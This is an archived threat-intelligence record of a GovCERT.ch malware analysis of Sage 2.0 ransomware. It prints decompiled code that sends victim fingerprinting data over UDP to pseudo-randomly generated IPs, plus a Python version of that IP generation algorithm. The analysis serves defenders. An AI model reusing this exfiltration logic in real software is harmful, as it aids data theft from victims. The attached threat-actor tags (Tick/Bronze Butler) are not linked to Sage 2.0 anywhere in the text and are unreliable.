{
    "id": "10f00f48-76ca-4464-9daa-5cb423ded74c",
    "created_at": "2023-01-12T15:00:25.417788Z",
    "updated_at": "2025-03-27T02:16:01.09464Z",
    "deleted_at": null,
    "sha1_hash": "ed90ca22784c986f29f94425c985b1feba751b6b",
    "title": "2017-01-30 - Sage 2.0 comes with IP Generation Algorithm (IPGA)",
    "authors": "",
    "file_creation_date": "2022-05-28T01:58:41Z",
    "file_modification_date": "2022-05-28T01:58:41Z",
    "file_size": 298194,
    "plain_text": "# Sage 2.0 comes with IP Generation Algorithm (IPGA)\n\n**[govcert.admin.ch/blog/27/saga-2.0-comes-with-ip-generation-algorithm-ipga](https://www.govcert.admin.ch/blog/27/saga-2.0-comes-with-ip-generation-algorithm-ipga)**\n\n## GovCERT.ch\n\n[Homepage](https://www.govcert.admin.ch/)\nWhitepapers\n\n### Whitepapers\n\nRecently published whitepapers:\n\n[Trickbot - An analysis of data collected from the botnet](https://www.govcert.admin.ch/whitepapers/3/trickbot-an-analysis-of-data-collected-from-the-botnet)\n\n[Scripting IDA Debugger to Deobfuscate Nymaim](https://www.govcert.admin.ch/whitepapers/2/scripting-ida-debugger-to-deobfuscate-nymaim)\n\n[Fobber Analysis](https://www.govcert.admin.ch/whitepapers/1/fobber-analysis)\n\n### Whitepapers RSS feed\n\n\nClose\n\n\nSubscribe to the whitepapers RSS feed to stay up to date and get notified about\nnew whitepapers.\n\n\n-----\n\n[Report an Incident](https://www.govcert.admin.ch/report/)\n\n### Report an incident to MELANI\n\nReport an incident: incidents[at]govcert{dot}ch\nGeneral inquiries: outreach[at]govcert{dot}ch\n\n### Point of contact for CERTs and CSIRTs\n\n\nClose\n\n\nThe following email address can be considered as point of contact for FIRST\nmembers and other CERTs/CSIRTs:\n\nincidents[at]govcert{dot}ch\n\n### Encrypted Email\n\n[GovCERT.ch PGP-Key](https://www.govcert.admin.ch/downloads/govcert.pgp)\n[GovCERT.ch SMIME](https://www.govcert.admin.ch/downloads/govcert_2021.crt)\n\n\n-----\n\n[Statistics](https://www.govcert.admin.ch/statistics/)\n\n\n-----\n\nClose\n\n## Breadcrumbs\n\nOn Jan 20, 2017, we came across a malware that appeared to be a new\nRansomware family called Sage 2.0. Within a couple of days we were able to\ncollect more than 200 malware binaries across our sensors associated with this\nnew Ransomware. Last week, Brad Duncan also wrote a SANS InfoSec Diary\nentry on [Sage 2.0, noticing some strange UDP packets sent to over 7'000](https://isc.sans.edu/forums/diary/Sage+20+Ransomware/21959/)\ndifferent IPs:\n\n_UDP traffic generated by Sage 2.0 (click to enlarge)_\nAccording to our initial analysis of Sage 2.0, the ransomware relies on\nCurve25519 --- an elliptic-curve Diffie–Hellman function – to generate keys for\nChacha20 encryption of the targeted files. The use of asymmetric encryption\nallows the ransomware to encrypt files without having to send keys back to the\nC2 infrastructure.\n\nIf no keys need to be sent out from infected systems, what data does the\nmalware send as UDP payload? And how are the over 7000 targets\ndetermined? This blog post tries to answer these question by first showing the\nalgorithm behind the UDP destinations. We then reveal how the payload is\nserialized and encrypted, and where to find the key to decrypt the network traffic.\n\n\n-----\n\nWe analyzed one of the Sage 2.0 samples provided by Brad Duncan on his\nMalware Traffic Analysis Blog (cfe8749de0954cee3966e1cbdb341e69), with\nmd5 cfe8749de0954cee3966e1cbdb341e69.\n\n## Target Determination\n\nAs mentioned by Brad Duncan in his write-up, Sage 2.0 first tries to send the\ndata with HTTP Post requests. The targets are determined by concatenating a\nhardcoded third level domain, in our case “mbfce24rgn65bx3g”, with one or\nmore domains taken from the encrypted config of Sage 2.0:\n```\n.text:004061C8 mov   eax, hardcoded_third_level_domain\n.text:004061CD push  ebx\n.text:004061CE push  eax       ; arg\n.text:004061CF push  offset second_and_top_level_domain ; \"%s.%s\"\n.text:004061D4 call  string_format\n\n```\nWe will come back to the encrypted config later when discussing the payload\nencryption. Our sample has two domains configured: rzunt3u2.com and\ner29sl.com. If a POST requests to either domains succeeds and trigger the\ncorrect response --- in our sample the string “107” --- then no UDP packets are\nsent at all.\n\nIf, however, the HTTP POSTs fail, then Sage 2.0 moves on to sending the same\ndata through UDP packets. The following pseudo-code produced by Hex-Ray’s\ndecompiler shows the routine that generates the UDP traffic:\n\n\n-----\n\n```\nint __cdecl send_with_udp_packets(char buf, int len)\n{\n (…)\n length = len;\n total_data_sent = 0;\n latest_tick_count = GetTickCount();\n to.sin_family = AF_INET;\n to.sin_port = htons(13655u);\n s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);\n *v11 = 999015818;\n *&v11[2] = 1926442245;\n packets_to_send = 8192;\n r = 242343;\n do\n {\n  r = (1 - 111051 * r) & 262143;\n  packets_still_to_send = packets_to_send - 1;\n  if ( ((((r ^ 0x3F390) << 16) | v11[(r ^ 0x3F390u) >> 16]) &\n0xF0000000) != 0xF0000000 )\n  {\n   to.sin_addr.S_un.S_addr = ((r ^ 0x3F390) << 16) | v11[(r ^ 0x3F390u)\n>> 16];\n   if ( sendto(s, buf, length, 0, &to, 16) == -1 )\n   {\n    closesocket(s);\n    s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);\n    if ( sendto(s, buf, length, 0, &to, 16) == -1 )\n    {\n     closesocket(s);\n     s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);\n    }\n   }\n   total_data_sent += length + 28;\n   v6 = GetTickCount() - latest_tick_count;\n   if ( total_data_sent > 0x20000 )\n   {\n    v7 = (total_data_sent - 0x20000) / 262;\n    if ( v6 < v7 )\n    {\n     v8 = v7 - v6;\n     if ( v8 > 0x32 )\n      v8 = 50;\n     SleepEx(v8, 0);\n    }\n   }\n  }\n  packets_to_send = packets_still_to_send;\n }\n while ( packets_still_to_send );\n return packets_to_send;\n}\n\n```\nThe next Python snippet summarizes the algorithm that generates the IP\naddresses:\n\n\n-----\n\n```\ndef uint2ip(u):\n  els = []\n  for i in range(4):\n    els.append(str((u & 0xFF)))\n    u >>= 8\n  return '.'.join(els) \ndef iga(seed):\n  r = seed \n  subnets = [0xc58a, 0x3b8b, 0x2d05, 0x72d3]\n  for i in range(0x200000):\n    r = (1 + ((151093*r))) % 262144\n    k = ((r ^ 0x3F390) << 16) | subnets[(r ^ 0x3F390) >> 16]\n    if ( (k & 0xF0000000) != 0xF0000000 ):\n      print(uint2ip(k))\niga(0x3B2A7)\n\n```\nThe targets are picked pseudo randomly from four class B subnets:\n\n5.45.0.0/16\n138.197.0.0/16\n139.59.0.0/16\n211.114.0.0/16\n8196 IP addresses are generated, but all addresses ending in .15 or lower are\nomitted, leaving 7702 IPs that are targeted one after another, with small wait\ntimes after ever 20 kB sent. The linear congruential generator used as pseudo\nrandom number generator is:\n```\nr = (1 + ((151093*r))) % 2^18\n\n```\nThe increment 1 is obviously relatively coprime to the modulus 2^18; and the\nmultiplier minus one (151093-1) is divisible by four. The random number\ngenerator is therefore full period, potentially covering all IPs in the four subnets if\nthe number of IPs would be increased to 2^18.\n\nPlease note that most of the IPs in the covered subnets are likely benign and\nsimply collateral damage. Blocking any of the targets or even using them in\nnetwork rules without further information is ill-advised.\n\nWhile other malware families are using a Domain Generation Algorithm (DGA)\nto determine the current botnet Command&Controller domains (C&C) to which\nthe infected machines (bots) should talk to, Sage 2.0 appears to be one of the\nvery first malware families that uses a similar technique to calculate the botnet's\nC&Cs IP addresses - some sort of IP Generation Algorithm (IPGA).\n\n## Data Serialization\n\n\n-----\n\nSage 2.0 sends fingerprinting information to the targets. The visualization at the\nend of this post shows an example of the sent data. The information includes\noperating system information, computer and user name, the processor name\nand information about network adapters. The fingerprinting also includes the\ninstalled input locale. If the language identifier is Kazakh, Russian, Ukrainian,\nUzbek or Yakut, then no files are encrypted. Sage 2.0 will only send back the\nfingerprinting information and then delete itself.\n\nThe fingerprinting information is serialized to a binary format with MessagePack\n(http://msgpack.org/index.html), which provides free implementations for many\nprogramming languages. Together with the implementations of the elliptic curve\nDiffie-Hellmann key derivation, and the implementation of ChaCha20 used for\nsymmetric encryption, MessagePack is one of three major components of Sage\n2.0 that are copied from open source projects.\n\n## Payload Encryption\n\nhe payload of the network traffic and the domain names are encrypted with\nChaCha20. The 256bit key is stored in the config at the end of the malware\nbinary. Each payload starts with an 8 byte identifier also taken from the end of\nthe malware binary. Note that, while the targeted files are also encrypted with\nChaCha20, the key in those cases are derived on a per file basis using elliptic\ncurve cryptography and can’t retrieved from the malware.\n\nThe following visualization summarizes how the fingerprinting information is\nserialized and encrypted:\n\n\n-----\n\n_Sage 2.0 fingerprinting visualization (click to enlarge)_\n## Recommendations\n\nTo avoid becoming a victim of Ransomware, we have published a set of\nrecommendations for private and corporate users. You can find them on the\nMELANI website:\n\n**Verschlüsselungstrojaner (German):**\n\n[https://www.melani.admin.ch/ransomware](https://www.melani.admin.ch/ransomware)\n\n**Rançongiciels (French):**\n\n[https://www.melani.admin.ch/rancongiciels](https://www.melani.admin.ch/rancongiciels)\n\n\n-----\n\n**Ransomware (Italian):**\n[https://www.melani.admin.ch/melani/it/home/themen/Ransomware.html](https://www.melani.admin.ch/melani/it/home/themen/Ransomware.html)\n\n**Ransomware (English):**\n[https://www.melani.admin.ch/melani/en/home/themen/Ransomware.html](https://www.melani.admin.ch/melani/en/home/themen/Ransomware.html)\n\n‹ › ×\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-01-30 - Sage 2.0 comes with IP Generation Algorithm (IPGA).pdf"
    ],
    "report_names": [
        "2017-01-30 - Sage 2.0 comes with IP Generation Algorithm (IPGA).pdf"
    ],
    "threat_actors": [
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1673535625,
    "ts_updated_at": 1743041761,
    "ts_creation_date": 1653703121,
    "ts_modification_date": 1653703121,
    "files": {
        "pdf": "https://archive.orkl.eu/ed90ca22784c986f29f94425c985b1feba751b6b.pdf",
        "text": "https://archive.orkl.eu/ed90ca22784c986f29f94425c985b1feba751b6b.txt",
        "img": "https://archive.orkl.eu/ed90ca22784c986f29f94425c985b1feba751b6b.jpg"
    }
}